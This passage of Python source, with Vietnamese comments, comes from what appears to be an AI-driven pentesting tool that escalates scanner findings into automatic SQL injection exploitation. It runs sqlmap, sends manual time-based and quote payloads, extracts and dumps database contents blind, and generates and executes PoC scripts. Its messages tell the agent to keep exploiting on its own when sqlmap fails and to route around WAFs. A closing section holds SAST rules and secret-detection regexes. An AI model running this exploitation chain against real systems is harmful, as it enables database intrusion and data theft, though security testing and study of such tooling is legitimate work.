            line = f"[{s.upper()}] {f['category']}{p} — {loc}{m}"
            if s != "info":
                line += f"\n    → {f['info'] or 'xem report'}"
                if f.get("wstg"):
                    line += f"\n    → wstg: {', '.join(f['wstg'])}"
                if f.get("curl_command"):
                    c = f["curl_command"]
                    if len(c) > 220:
                        c = c[:220] + "..."
                    line += f"\n    → curl: {c}"
            lines.append(line)
            shown += 1
            if shown >= detail_budget:
                rem = len(findings) - shown
                if rem > 0:
                    lines.append(f"[i] ... còn {rem} mục khác — xem đầy đủ trong report JSON: {report_path}")
                break
        if shown >= detail_budget:
            break

    # ── v1.5.3 (nhiệm vụ 3): TỔNG HỢP LỖ HỔNG — hướng KHAI THÁC + KHẮC PHỤC
    lines.append("[✓] TỔNG HỢP LỖ HỔNG — HƯỚNG KHAI THÁC & KHẮC PHỤC:")
    sum_seen: set[tuple] = set()
    sum_count = 0
    for s in sev_sort:
        for f in by_sev.get(s, []):
            key = (f["category"], f["method"], f["path"], f["parameter"])
            if key in sum_seen:
                continue
            sum_seen.add(key)
            loc = f["method"] + " " + (f["path"] or "?")
            p = f["parameter"] or "?"
            ex = _WAPITI_EXPLOIT.get(f["category"], _WAPITI_EXPLOIT["_default"])
            fx = _WAPITI_FIX.get(f["category"], _WAPITI_FIX["_default"])
            lines.append(f"[{s.upper()}] {f['category']} — {loc} (param={p})")
            lines.append(f"    → khai thác: {ex}")
            lines.append(f"    → khắc phục: {fx}")
            sum_count += 1
            if sum_count >= 10:  # giữ context gọn; phần còn lại nằm trong report JSON
                break
        if sum_count >= 10:
            break
    if sum_count == 0:
        lines.append("[i] (không có finding nào để tổng hợp — chỉ có mục info đã liệt kê trên.)")

    # ── AUTO-EXPLOIT: sqlmap FIRST sau khi wapiti CONFIRMED (luật v1.4.7 giữ nguyên)
    if exploit:
        sql_cats = ("SQL Injection", "Blind SQL Injection")
        sqli = [f for f in findings if f["category"] in sql_cats]
        if sqli:
            lines.append(f"[→] TỰ ĐỘNG KHAI THÁC (exploit=true): sqlmap_runner trên "
                         f"{min(len(sqli), _WAPITI_MAX_EXPLOIT)}/{len(sqli)} SQLi "
                         f"— sqlmap-FIRST sau wapiti CONFIRMED.")
            elapsed = time.monotonic() - t0
            sql_budget = max(30, min(180, int(budget - elapsed - 5)))
            for i, f in enumerate(sqli[:_WAPITI_MAX_EXPLOIT], 1):
                target, data = _wapiti_sqli_target(url, f)
                dbms = "auto"
                m = re.search(r"DBMS:\s*([^)\]}]+)", f["info"])
                if m:
                    d = m.group(1).strip().lower()
                    if "microsoft sql" in d or "mssql" in d:
                        dbms = "mssql"
                    elif "mysql" in d:
                        dbms = "mysql"
                tech = "T" if f["category"] == "Blind SQL Injection" else "E"
                sql_out = _sqlmap_runner(url=target, data=data, dbms=dbms,
                                         technique=tech, timeout=sql_budget,
                                         _timeout=sql_budget)
                lines.append(f"\n[r] KHAI THÁC #{i}: {f['category']} — "
                             f"{f['method']} {f['path']} "
                             f"(param={f['parameter'] or '?'}, dbms={dbms}, "
                             f"technique={tech}, target={target})")
                lines.append(sql_out)
                # ── v1.5.3 (nhiệm vụ 2): sqlmap THẤT BẠI → AI TỰ KHAI THÁC
                _FAIL_MARKS = ("không thấy dấu hiệu", "not injectable",
                               "no parameter(s)")
                _sqlmap_failed = (sql_out.lstrip().startswith("[!]")
                                  or any(m in sql_out.lower() for m in _FAIL_MARKS))
                if _sqlmap_failed:
                    # v1.5.7: DBMS không xác định → engine='auto' (KHÔNG ép mssql)
                    eng = dbms if dbms in ("mysql", "mssql") else "auto"
                    meth = (f["method"] or "get").lower()
                    blind_data = data or ""
                    lines.append(
                        f"[→] SQLMAP THẤT BẠI #{i} ({f['path']} param={f['parameter'] or '?'}) "
                        f"— sqlmap không khai thác được (WAF/template hấp thụ/kênh đặc biệt). "
                        f"AI TỰ KHAI THÁC (v1.5.3): chạy sqli_blind_extract "
                        f"{{'url': '{target}', 'action': 'detect', 'known_confirmed': true, "
                        f"'method': '{meth}', 'param': '{f['parameter'] or ''}', "
                        f"'data': '{blind_data}', 'engine': '{eng}'}} "
                        f"— KHÔNG gọi lại sqlmap_runner cho url này nữa.")
        else:
            lines.append("[i] Không có SQLi để auto-exploit; các finding khác đã kèm "
                         "payload + hướng dẫn bên trên.")
    lines.append(f"[i] report JSON (bằng chứng đầy đủ): {report_path}")
    return "\n".join(lines), wdata


def _form_from_payload(payload: str, param: str) -> dict:
    """Chuyển payload form string sang dict POST data cho đúng param đang test.

    - 'q=test' với param=q  → {"q": "test"}
    - 'param=1 AND SLEEP(3)' (kiểu GET) → {"q": "1 AND SLEEP(3)"}
    - 'keyword=x' với param=q → {"q": "x"} (đổi key về param)
    """
    p = (payload or "").strip()
    if p.lower().startswith("param="):
        p = p[len("param="):]
    if "=" not in p:
        return {param: p}
    from urllib.parse import parse_qsl
    first_key = p.split("&", 1)[0].split("=", 1)[0].strip()
    if first_key != param:
        val = p.split("&", 1)[0].split("=", 1)[1]
        p = f"{param}={val}"
    return dict(parse_qsl(p, keep_blank_values=True))


def _guess_engine(resp) -> str:
    """Ước lượng DB backend từ response headers (cho engine=auto).
    ASP.NET/IIS → mssql; PHP → mysql; không có tín hiệu → "" (tool tự chọn mysql)."""
    try:
        hdrs = getattr(resp, "headers", None) or {}
        raw = ""
        for k in ("X-Powered-By", "Server", "X-AspNet-Version", "Set-Cookie"):
            try:
                raw += " " + str(hdrs.get(k, ""))
            except Exception:  # noqa: BLE001
                pass
        low = raw.lower()
        if any(t in low for t in ("asp.net", "microsoft-iis", "aspnetsessionid", "x-aspnet")):
            return "mssql"
        if "php" in low:
            return "mysql"
    except Exception:  # noqa: BLE001
        pass
    return ""


def _sqli_manual_test(**kw):
    """SQLi thủ công v2 (v1.4.4):

    1) QUOTE-DIFFERENTIAL (error-based) — 3 request: baseline 'test' vs 'test'' vs "test'"
       Nếu nháy đơn LÀM VỠ truy vấn (500/khác size) mà nháy đơn kép KHỚP baseline
       → điểm chèn SQLi xác nhận, KHÔNG cần biết engine (hoạt động trên example.com
       — form tìm kiếm MSSQL mà mọi payload time/boolean đều vỡ vì --
       không dùng được).
    2) TIME-BASED — chỉ chạy khi quote-differential không xác nhận: engine
       mysql (SLEEP(n)) | mssql (WAITFOR DELAY '0:0:n') | auto (đoán từ headers,
       mặc định mysql).
    Trả verdict CONFIRMED/NOT_CONFIRMED kèm bằng chứng từng request. Bỏ tham số
    baseline/delay_payload (model hay truyền rác như "0.80"/"3" ở v1.4.3).
    """
    import time as t
    import requests

    url = kw["url"]
    param = kw.get("param") or ""
    method = str(kw.get("method", "get")).lower().strip()
    engine = str(kw.get("engine") or "auto").lower().strip()
    if engine not in ("mysql", "mssql", "auto"):
        return f"[!] sqli_manual_test: engine phải là mysql|mssql|auto (nhận '{engine}')."
    if not param:
        return ("[!] sqli_manual_test cần 'param' (tên tham số form). Chạy wapiti_scan "
                "(crawler tìm form/param) hoặc http_probe trước để biết tên input "
                "(vd 'keyword') rồi gọi lại với param đó.")
    delay = max(1, int(float(kw.get("delay") or 3)))
    seed = "test"
    req_timeout = max(15, delay + 5)

    def send(value: str):
        """(status, elapsed, len_content, response_or_err)"""
        try:
            if method == "post":
                r = requests.post(url, data=_form_from_payload(f"{param}={value}", param),
                                  timeout=req_timeout,
                                  headers={"User-Agent": "Mozilla/5.0"})
            else:
                sep = "&" if "?" in url else "?"
                r = requests.get(f"{url}{sep}{param}={value}", timeout=req_timeout,
                                 headers={"User-Agent": "Mozilla/5.0"})
            return r.status_code, r.elapsed.total_seconds(), len(r.content), r
        except requests.RequestException as e:
            return 0, 0.0, 0, f"lỗi {e}"

    rows = []  # (label, value, status, elapsed, length, resp)
    b_st, b_el, b_ln, resp_b = send(seed)
    rows.append(("baseline", seed, b_st, b_el, b_ln))

    if engine == "auto":
        hint = _guess_engine(resp_b)
        if hint:
            engine = hint
        else:
            engine = "mysql"  # mặc định khi không có tín hiệu header

    q1 = send(seed + "'")
    rows.append(("quote-single", seed + "'", q1[0], q1[1], q1[2]))
    q2 = send(seed + "''")
    rows.append(("quote-double", seed + "''", q2[0], q2[1], q2[2]))

    def differs(st, ln) -> bool:
        if st == 0:  # network error — không tính là tín hiệu SQL
            return False
        return st != b_st or abs(ln - b_ln) > max(200, b_ln * 0.1)

    sensitive = differs(q1[0], q1[2])
    doubled_ok = not differs(q2[0], q2[2])

    time_rows = []
    verdict, method_used = "NOT_CONFIRMED", ""
    if sensitive and doubled_ok:
        verdict, method_used = "CONFIRMED", "quote-differential (error-based)"
    else:
        # fallback time-based theo engine
        pl = (f"{seed}' AND SLEEP({delay})-- -" if engine == "mysql"
              else f"{seed}' AND WAITFOR DELAY '0:0:{delay}'-- -")
        t_st, t_el, t_ln, _ = send(pl)
        rows.append(("time-based", pl, t_st, t_el, t_ln))
        time_rows.append((pl, t_st, t_el, t_ln))
        delta = t_el - b_el
        if t_st != 0 and delta >= max(1.5, delay * 0.6):
            verdict, method_used = "CONFIRMED", f"time-based ({engine})"

    lines = [f"[i] target: {method.upper()} {url} — param='{param}', engine={engine}, "
             f"delay={delay}s"]
    for label, value, st, el, ln in rows:
        mark = ""
        if label in ("quote-single", "quote-double", "time-based") and st != 0:
            if label == "time-based":
                mark = f" (delta {el - b_el:+.2f}s vs baseline)"
            elif differs(st, ln):
                mark = "  ← KHÁC baseline"
            else:
                mark = "  ← KHỚP baseline"
        err = f" (request lỗi)" if st == 0 else ""
        lines.append(f"[*] {label:<13} {param}='{value}' → {st or 'ERR'}, "
                     f"{el:.2f}s, {ln} B{mark}{err}")
    if verdict == "CONFIRMED":
        lines.append(f"[✓] SQLI CONFIRMED — {method_used} tại param '{param}' "
                     f"({method.upper()} {url})")
        # v1.4.7: CONFIRMED → sqlmap_runner FIRST (bounded); manual chỉ FALLBACK
        lines.append(
            "[→] BƯỚC TIẾP THEO: (1) sqlmap_runner {url, "
            + (f"data:'{param}={seed}', " if method == "post" else "")
            + f"dbms:'{engine}', technique:'BEUSTQ'}} — sqlmap BOUNDED để trích "
              "xuất databases/tables; CHỈ khi sqlmap_runner không ra dữ liệu "
              "mới (2) sqli_blind_extract {url, action:'version' hoặc "
            + (f"'database', engine:'{engine}', method:'{method}', param:'{param}', "
               f"data:'{param}={seed}', known_confirmed:true" if method == "post"
               else f"engine:'{engine}', known_confirmed:true "
               "(bỏ qua lưới 9 probe — lỗi đã xác nhận)")
            + "} → (3) generate_poc → poc_executor với poc_path để chạy POC khai thác.")
    else:
        if len(rows) and all(st == 0 for _, _, st, _, _ in rows):
            # v1.4.6: mọi probe status-0 → nghi WAF chặn payload
            dbms = engine if engine in ("mssql", "mysql") else "mssql"
            form = " --form" if method == "post" else ""
            lines.append(
                "[-] SQLI NOT_CONFIRMED — mọi probe bị reset (status 0). "
                "Nghi WAF chặn payload → không spam thêm; chạy "
                f"sqlmap{form} -u {url} --dbms={dbms} --technique=E --batch "
                "(WAF hay chặn time-based → dùng error-based E).")
        else:
            lines.append(f"[-] SQLI NOT_CONFIRMED — quote-differential âm tính"
                         + (f" và time-based {engine} không tạo phản hồi chậm" if time_rows else "")
                         + ". Thử sqlmap_check/sqli_blind_extract hoặc param khác trong form "
                           "(tham số từ wapiti_scan/http_probe).")
    lines.append(f"[+] verdict: {verdict}" + (f" — {method_used}" if method_used else ""))
    # v1.7.0 (structured ToolResult): data cho inventory — confirmed + param
    sdata = {"url": url, "method": method, "param": param, "engine": engine,
             "confirmed": verdict == "CONFIRMED", "verdict": verdict,
             "method_used": method_used}
    return "\n".join(lines), sdata


def _sqli_blind_extract(**kw):
    """SQLi time-based blind KHÔNG sqlmap: detect + extract (query & path injection).

    Wrap TimeBlindExploiter (sqli_blind_poc.py). Dùng khi sqlmap fail, ví dụ
    path-injection /search/123.html. Extraction rất chậm (mỗi ký tự ~13 probe).
    v1.4.5: hỗ trợ POST form — truyền method='post' + param + data='kw=...' để
    detect/extract trên form tìm kiếm (vd /WebTinTuc/TimKiem keyword).
    v1.4.5: engine=mssql → ưu tiên error-based oracle (CONVERT(int,...) đọc từ
    lỗi 500) trước time-based; đọc @@VERSION/DB_NAME()/SUSER_SNAME()/tables/dump.
    v1.4.6: known_confirmed=true → bỏ qua lưới 9 probe nếu lỗi đã xác nhận ở
    phiên trước; WAF burst (≥2 probe status-0) → dừng sớm + hướng dẫn
    sqlmap --technique=E (thêm --form khi method=post).
    """
    action = kw.get("action", "detect")
    # v1.5.7: engine-consistency — resolve engine NGAY tại đây (engine='auto' →
    # đoán từ headers qua _sweep_engine, cache theo host; mọi hint bên dưới
    # (WAF/extraction-failed) dùng ĐÚNG engine, KHÔNG coerce unknown → mssql).
    engine = str(kw.get("engine") or "mysql").lower().strip()
    if engine == "auto":
        engine = _sweep_engine(kw["url"], int(kw.get("timeout") or 15)) or "mysql"
    elif engine not in ("mssql", "mysql"):
        engine = "mysql"
    try:
        from sqli_blind_poc import TimeBlindExploiter
    except ImportError:  # khi tools.py được import từ nơi khác
        import importlib.util
        here = os.path.dirname(os.path.abspath(__file__))
        spec = importlib.util.spec_from_file_location(
            "sqli_blind_poc", os.path.join(here, "sqli_blind_poc.py"))
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        TimeBlindExploiter = mod.TimeBlindExploiter

    ex = TimeBlindExploiter(
        kw["url"],
        delay=float(kw.get("delay", 3.0)),
        threshold=float(kw.get("threshold", 2.5)),
        timeout=int(kw.get("timeout") or 15),
        engine=engine,
        method=str(kw.get("method") or "get"),
        param=kw.get("param") or None,
        data=kw.get("data") or None,
        known_confirmed=bool(kw.get("known_confirmed", False)),
    )
    try:
        res = ex.report(action,
                        db_name=kw.get("db_name", ""),
                        table=kw.get("table", ""),
                        columns=[c.strip() for c in (kw.get("columns") or "").split(",") if c.strip()],
                        limit=int(kw.get("limit", 10)),
                        max_len=int(kw.get("max_len", 60)))
    except Exception as e:  # noqa: BLE001
        return f"[!] sqli_blind_extract lỗi: {e}", None
    if not res.get("confirmed"):
        err = res.get("error") or "unknown"
        out = (f"[-] SQLi NOT CONFIRMED — {err}\n"
               f"[i] URL: {kw['url']} (delay={ex.delay}s, threshold={ex.threshold}s)")
        if res.get("waf_suspected"):
            # v1.4.6: WAF chặn probe → hướng sqlmap error-based E
            form = " --form" if str(kw.get("method") or "get").lower() == "post" else ""
            dbms = engine  # v1.5.7: engine đã resolved (mysql|mssql) — không coerce unknown→mssql
            out += (f"\n[!] WAF suspected (probe status-0) — chạy: "
                    f"sqlmap{form} -u {kw['url']} --dbms={dbms} "
                    f"--technique=E --batch")
        # v1.7.0: data kèm confirmed=False → inventory không thêm endpoint ảo
        return out, {"url": kw["url"],
                     "method": str(kw.get("method") or "get"),
                     "param": kw.get("param") or "",
                     "engine": engine, "confirmed": False,
                     "error": res.get("error") or ""}
    lines = [f"[✓] SQLi CONFIRMED — {res.get('injection') or ''}",
             f"[i] mode={res.get('mode')} · delay={ex.delay}s · threshold={ex.threshold}s"]
    if ex.known_confirmed:
        # v1.4.6: lỗi đã xác nhận ở phiên trước → bỏ qua lưới 9 probe
        lines.append("[i] known_confirmed: true — bỏ qua lưới 9 probe "
                     "(lỗi đã xác nhận từ trước)")
    sdata = res.get("data") or {}
    has_data = any(v for v in sdata.values() if v)
    # v1.4.7: oracle im lặng (0 byte — quote-parity mock / template CONTAINS thật)
    # → KHÔNG giả vờ đã extract (v1.4.6 in ra '[+] version: ' trống với outcome=ok);
    # trả outcome=error kèm hướng sqlmap → pipeline chuyển sqlmap_runner FIRST.
    if res.get("extraction_failed") or (action != "detect" and not has_data):
        form = " --form" if str(kw.get("method") or "get").lower() == "post" else ""
        # v1.5.7: engine resolved (mysql|mssql) hoặc auto — 'auto' thì KHÔNG
        # emit --dbms để sqlmap tự dò; sqlmap_cmd từ sqli_blind_poc cũng vậy.
        dbms = engine if engine in ("mssql", "mysql") else "auto"
        dbm_flag = f"--dbms={dbms} " if dbms != "auto" else ""
        smc = res.get("sqlmap_cmd") or (
            f"sqlmap{form} -u {kw['url']} {dbm_flag}--technique=BEUSTQ "
            f"--batch --level 1 --risk 1 --threads 1")
        default_err = ("Oracle trích xuất IM LẶNG — 0 byte: payload bị hấp thụ trong "
                       "string literal (quote-parity), KHÔNG có kênh dữ liệu nào để "
                       "extract manual. Đây là hạn chế của kênh, không phải lỗi cấu hình.")
        head = f"[!] {res.get('error') or default_err}"
        tip = (f"[i] Chuyển sang sqlmap: gọi sqlmap_runner {{\"url\": \"{kw['url']}\""
               + (f", \"data\": \"{kw['data']}\"" if kw.get("data") else "")
               + f", \"dbms\": \"{dbms}\"}} — hoặc chạy: {smc}")
        # v1.7.0: CONFIRMED nhưng extraction im lặng → data vẫn đánh dấu endpoint
        return (head + "\n" + tip,
                {"url": kw["url"], "method": str(kw.get("method") or "get"),
                 "param": kw.get("param") or "", "engine": engine,
                 "confirmed": True, "injection": res.get("injection") or "",
                 "extracted": {}})
    for k, v in sdata.items():
        if v is None:
            continue
        if isinstance(v, list):
            lines.append(f"[+] {k}: " + ", ".join(str(x) for x in v)[:2000])
        else:
            lines.append(f"[+] {k}: {str(v)[:3000]}")
    return ("\n".join(lines),
            {"url": kw["url"], "method": str(kw.get("method") or "get"),
             "param": kw.get("param") or "", "engine": engine,
             "confirmed": True, "injection": res.get("injection") or "",
             "extracted": sdata})


def _generate_poc(**kw):
    """Sinh POC Python khai thác SQLi time-based blind (KHÔNG sqlmap).

    Dùng trong pipeline fallback khi sqlmap_check fail:
      sqli_blind_extract (detect) → generate_poc → poc_executor.
    Code ~6-7KB vượt context cap 5000 ký tự nên KHÔNG trả code đầy đủ
    inline — ghi ra tempfile (/tmp/aixsec-x_poc_*.py) và trả poc_path + snippet
    25 dòng để model kiểm tra. Model gọi poc_executor với poc_path.
    """
    import sys
    import tempfile

    url = kw.get("url", "")
    mode = kw.get("mode", "query")
    action = kw.get("action", "detect")
    try:
        from poc_generator import generate_poc as _gen
    except ImportError:  # khi tools.py được import từ nơi khác
        import importlib.util
        here = os.path.dirname(os.path.abspath(__file__))
        spec = importlib.util.spec_from_file_location(
            "poc_generator", os.path.join(here, "poc_generator.py"))
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        _gen = mod.generate_poc

    try:
        code = _gen(
            url=url,
            mode=mode,
            action=action,
            delay=float(kw.get("delay", 3.0)),
            threshold=float(kw.get("threshold", 2.5)),
            table=kw.get("table", ""),
            columns=kw.get("columns", ""),
            include_user=bool(kw.get("include_user", False)),
            include_tables=bool(kw.get("include_tables", False)),
            limit=int(kw.get("limit", 10)),
        )
    except Exception as e:  # noqa: BLE001
        return f"[!] generate_poc lỗi: {e}"

    fd, path = tempfile.mkstemp(prefix="aixsec-x_poc_", suffix=".py",
                                dir=tempfile.gettempdir())
    with os.fdopen(fd, "w") as f:
        f.write(code)

    # 25 dòng đầu: header, imports, class khởi đầu — đủ để model thẩm định
    snippet = "\n".join(code.splitlines()[:25])
    return (f"[✓] Đã sinh POC Python (KHÔNG sqlmap): {len(code)} bytes\n"
            f"[i] poc_path: {path}\n"
            f"[i] mode={mode} action={action} delay={kw.get('delay', 3.0)}s "
            f"threshold={kw.get('threshold', 2.5)}s\n"
            f"[i] Chạy ngay: poc_executor {{\"poc_path\": \"{path}\", \"timeout\": 90}}\n"
            f"[*] Snippet 25 dòng đầu (code đầy đủ trong poc_path):\n"
            f"```\n{snippet}\n```")


def _poc_executor(**kw):
    """Chạy POC Python (generate_poc) — CHỈ file aixsec-x_poc_*.py trong tempdir.

    poc_code: source trực tiếp (model tự viết nhỏ gọn).
    poc_path: file do generate_poc sinh — validate tempdir + prefix aixsec-x_poc_
    để chặn arbitrary file exec. Risk = active (có approval gate).
    """
    import subprocess
    import sys
    import tempfile

    timeout = int(kw.get("timeout") or 120)
    code = kw.get("poc_code", "")
    path = kw.get("poc_path", "")

    if code and path:
        return "[!] poc_executor chỉ nhận 1 trong hai: poc_code HOẶC poc_path"
    if code:
        src = code
        src_name = "<poc_code>"
    elif path:
        tmpdir = os.path.realpath(tempfile.gettempdir())
        real = os.path.realpath(path)
        base_ok = os.path.basename(real).startswith("aixsec-x_poc_")
        if not os.path.isabs(real) or not real.startswith(tmpdir + os.sep) or not base_ok:
            return ("[!] poc_path bị từ chối: chỉ chạy file tạm aixsec-x_poc_*.py "
                    "trong tempdir (chống arbitrary file exec).")
        try:
            with open(real) as f:
                src = f.read()
        except OSError as e:
            return f"[!] Không đọc được poc_path: {e}"
        src_name = real
    else:
        return "[!] poc_executor cần poc_code (source) hoặc poc_path (từ generate_poc)."

    try:
        compile(src, src_name, "exec")
    except SyntaxError as e:
        return f"[!] poc_executor SyntaxError: {e}"

    try:
        r = subprocess.run([sys.executable, "-c", src], capture_output=True,
                           text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return f"[!] poc_executor timeout sau {timeout}s (target chậm hoặc SLEEP quá lớn)"
    out = (r.stdout or "") + (r.stderr or "")
    if r.returncode != 0:
        return (f"[!] poc_executor exit={r.returncode}\n" + out[-4000:])
    if len(out) > 6000:
        out = out[:6000] + f"\n...[cắt] tổng {len(out)} ký tự"
    return out.strip() or "[i] poc_executor OK (không có output)"


def _param_discovery(**kw):
    """arjun: tìm tham số ẩn trên endpoint."""
    _need("arjun")
    return run_cmd(["arjun", "-u", kw["url"], "-q"], kw["_timeout"])


# ─────────────────────────────────────────────
# TOOLS — OOB / interactive
# ─────────────────────────────────────────────

def _oob_interactsh(**kw):
    """Chạy interactsh-client nền để nhận callback OOB trong N giây."""
    import threading
    import tempfile
    outfile = tempfile.mktemp(prefix="interactsh_", suffix=".log")

    def _run():
        with open(outfile, "w") as f:
            try:
                subprocess.run(["interactsh-client", "-v", "-t", "10"], timeout=25,
                               stdout=f, stderr=subprocess.STDOUT)
            except Exception:
                pass

    threading.Thread(target=_run, daemon=True).start()
    return (f"[i] interactsh-client đã chạy nền trong ~10s, log: {outfile}\n"
            f"[i] Domain callback sẽ xuất hiện trong log. Tool khác (nuclei -o \"{outfile}\") "
            f"có thể dùng. Kết quả OOB không đồng bộ.")


# ─────────────────────────────────────────────
# ─────────────────────────────────────────
# TOOLS — SAST (static source analysis)
# ─────────────────────────────────────────

SKIP_SCAN_DIRS = {
    ".git", ".svn", ".hg", "node_modules", "vendor", "dist", "build",
    "__pycache__", ".venv", "venv", ".tox", ".idea", ".vscode",
    "coverage", ".next", ".nuxt", "target", ".terraform",
}
SKIP_SCAN_EXTS = {
    ".png", ".jpg", ".jpeg", ".gif", ".webp", ".ico", ".bmp", ".svg",
    ".woff", ".woff2", ".ttf", ".otf", ".eot", ".pdf", ".zip", ".gz",
    ".tar", ".7z", ".class", ".jar", ".o", ".so", ".a", ".pyc",
    ".pyo", ".min.js", ".map", ".pak", ".lock", ".sum", ".whl",
}
LANG_EXT = {
    "php": {".php", ".php3", ".php4", ".php5", ".phtml", ".inc"},
    "python": {".py", ".pyw"},
    "javascript": {".js", ".mjs", ".cjs", ".ts", ".jsx", ".tsx"},
    "java": {".java"},
}

_BAD_SECRET_RE = re.compile(r"(your_|changeme|change_me|example|placeholder|<|\{\{|\$\(|\$\{)", re.I)


def _looks_secret(match_text: str) -> bool:
    """Lọc false-positive credential: placeholder/example/{{...}}/$(...)."""
    m = re.match(r"[^=:=]+\s*[=:]\s*[\"']([^\"']+)[\"']", match_text)
    value = (m.group(1) if m else match_text).strip()
    if len(value) < 6:
        return False
    low = value.lower()
    if low in {"password", "secret", "pass", "123456", "12345678", "qwerty", "admin"}:
        return False
    return not _BAD_SECRET_RE.search(value)


# (name, severity, regex, hint) — heuristic pattern, KHÔNG phải dataflow analysis
SAST_PATTERNS: dict[str, list[tuple]] = {
    "php": [
        ("PHP RCE — eval với biến", "critical", re.compile(r"\beval\s*\(\s*\$", re.I),
         "eval() nhận biến → RCE nếu biến từ user"),
        ("PHP RCE — preg_replace /e", "critical", re.compile(r"pre[g]?_replace\s*\(\s*[\"'][^\"']*/e", re.I),
         "Modifier /e (PHP<7) → code execution"),
        ("PHP RCE — assert với biến", "high", re.compile(r"\bassert\s*\(\s*\$", re.I),
         "PHP 5: assert(string) chạy như eval — đúng kiểu expression-only PoC"),
        ("PHP RCE — create_function", "high", re.compile(r"\bcreate_function\s*\(", re.I),
         "create_function = eval ẩn"),
        ("PHP Command exec với biến", "critical", re.compile(r"\b(?:system|passthru|shell_exec|exec|proc_open|popen)\s*\(\s*\$", re.I),
         "Lệnh hệ thống nhận biến từ input"),
        ("PHP Command exec", "high", re.compile(r"\b(?:system|passthru|shell_exec|exec|proc_open|popen|pcntl_exec)\s*\(", re.I),
         "Gọi lệnh hệ thống — kiểm tra input user"),
        ("PHP LFI/RFI", "high", re.compile(r"\b(?:include|require)(?:_once)?\s*\(?\s*\$_(?:GET|POST|REQUEST|COOKIE)", re.I),
         "Include file theo input user → LFI/RFI"),
        ("PHP SSRF/LFI — file từ user", "high", re.compile(r"\b(?:file_get_contents|fopen|readfile|fpassthru|file)\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)", re.I),
         "Đọc file/URL theo input user"),
        ("PHP Object Injection", "high", re.compile(r"\bunserialize\s*\(\s*\$", re.I),
         "unserialize input user → object injection/RCE"),
        ("PHP SQLi — query nối biến", "high", re.compile(r"\b(?:mysqli?_query|pg_query|sqlite_query|query|exec|execute|prepare)\s*\([^;]*\$", re.I),
         "SQL nối biến → SQL injection"),
        ("PHP Variable overwrite", "high", re.compile(r"\bextract\s*\(\s*\$_?(?:GET|POST|REQUEST|COOKIE)", re.I),
         "extract() superglobal → ghi đè biến"),
        ("PHP Ghi file từ user", "high", re.compile(r"\b(?:file_put_contents|fwrite|fputs)\s*\([^;]*\$_(?:GET|POST|REQUEST|COOKIE)", re.I),
         "Ghi file theo input user — kiểm tra path/whitelist"),
        ("PHP Upload tùy ý", "high", re.compile(r"\b(?:move_uploaded_file|copy|rename)\s*\([^;]*\$_(?:FILES|GET|POST|REQUEST)", re.I),
         "Upload handler — kiểm tra extension (pattern banhanh.php kiểu @copy)"),
        ("PHP XSS — echo superglobal", "medium", re.compile(r"\b(?:echo|print)\s*\$_(?:GET|POST|REQUEST|COOKIE)", re.I),
         "Xuất input user không escape → XSS"),
        ("PHP Header injection", "medium", re.compile(r"\bheader\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)", re.I),
         "Header theo user — kiểm tra CRLF"),
    ],
    "python": [
        ("Python RCE — eval/exec", "high", re.compile(r"\b(?:eval|exec)\s*\(", re.I),
         "eval/exec — nếu input user → RCE"),
        ("Python Command exec", "high", re.compile(r"\bos\.system\s*\(|\bsubprocess\.(?:run|call|Popen|check_output|check_call)\s*\([^)]*shell\s*=\s*True", re.I),
         "Thực thi shell (shell=True)"),
        ("Python Deserialization", "high", re.compile(r"\bpickle\.(?:load|loads)\s*\(", re.I),
         "pickle không an toàn → RCE khi đọc dữ liệu lạ"),
        ("Python YAML unsafe", "high", re.compile(r"\byaml\.load\s*\(", re.I),
         "yaml.load cần SafeLoader — input user → RCE"),
        ("Python SSTI", "high", re.compile(r"\brender_template_string\s*\(", re.I),
         "SSTI nếu template chứa input user"),
        ("Python SQLi — interpolate", "high", re.compile(r"\b(?:execute|executemany)\s*\([^)]*%[sdif]", re.I),
         "SQL dùng % khai báo — SQL injection"),
        ("Python SQLi — f-string/format", "high", re.compile(r"\b(?:execute|executemany)\s*\([^)]*(?:f[\"']|\.format\s*\()", re.I),
         "SQL dùng f-string/format — SQL injection"),
    ],
    "javascript": [
        ("JS RCE — eval", "high", re.compile(r"\beval\s*\(|\bnew\s+Function\s*\(", re.I),
         "eval/Function — input user → code exec"),
        ("JS Command exec", "high", re.compile(r"\bchild_process\.(?:exec|execSync|spawn|fork)\s*\(", re.I),
         "Thực thi lệnh hệ thống"),
        ("JS DOM XSS — innerHTML", "medium", re.compile(r"\.innerHTML\s*=\s*[^;\"']", re.I),
         "innerHTML với biến → DOM XSS"),
        ("JS Prototype pollution", "medium", re.compile(r"(?:\[\s*(?:__proto__|prototype)\s*]|\.prototype\.|pollut)", re.I),
         "Gán __proto__/prototype — prototype pollution"),
    ],
    "java": [
        ("Java RCE — Runtime.exec", "high", re.compile(r"Runtime\.getRuntime\(\)\.exec|ProcessBuilder", re.I),
         "Thực thi lệnh hệ thống"),
        ("Java Deserialization", "high", re.compile(r"\bObjectInputStream|readObject\s*\(", re.I),
         "Deserialize không an toàn → RCE"),
        ("Java SQLi — nối chuỗi", "high", re.compile(r"\b(?:execute|executeQuery|executeUpdate)\s*\([^)]*\"\s*\+", re.I),
         "SQL nối chuỗi → SQL injection"),
    ],
}

SECRET_PATTERNS: list[tuple] = [
    ("Hardcoded credential", "high", re.compile(r"\b(?:password|passwd|pwd|pass|secret|passphrase|db[_-]?pass(?:word|wd)?|api[_-]?key|apikey|auth[_-]?token|access[_-]?key|client[_-]?secret|private[_-]?key)\s*[=:]\s*[\"'][^\"']{6,}", re.I),
     "Credential hardcode — leak nếu commit lên git"),
    ("Private key", "critical", re.compile(r"-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----"),
     "Private key trong source"),
    ("AWS Access Key", "high", re.compile(r"\bAKIA[0-9A-Z]{16}\b"), "AWS access key"),
    ("OpenAI API key", "high", re.compile(r"\bsk-[A-Za-z0-9]{20,}\b"), "OpenAI API key"),
    ("GitHub token", "high", re.compile(r"\bghp_[A-Za-z0-9]{36}\b|\bgithub_pat_[A-Za-z0-9_]{20,}\b"), "GitHub token"),
    ("Slack token", "high", re.compile(r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b"), "Slack token"),
    ("Google API key", "high", re.compile(r"\bAIza[0-9A-Za-z_-]{35}\b"), "Google API key"),
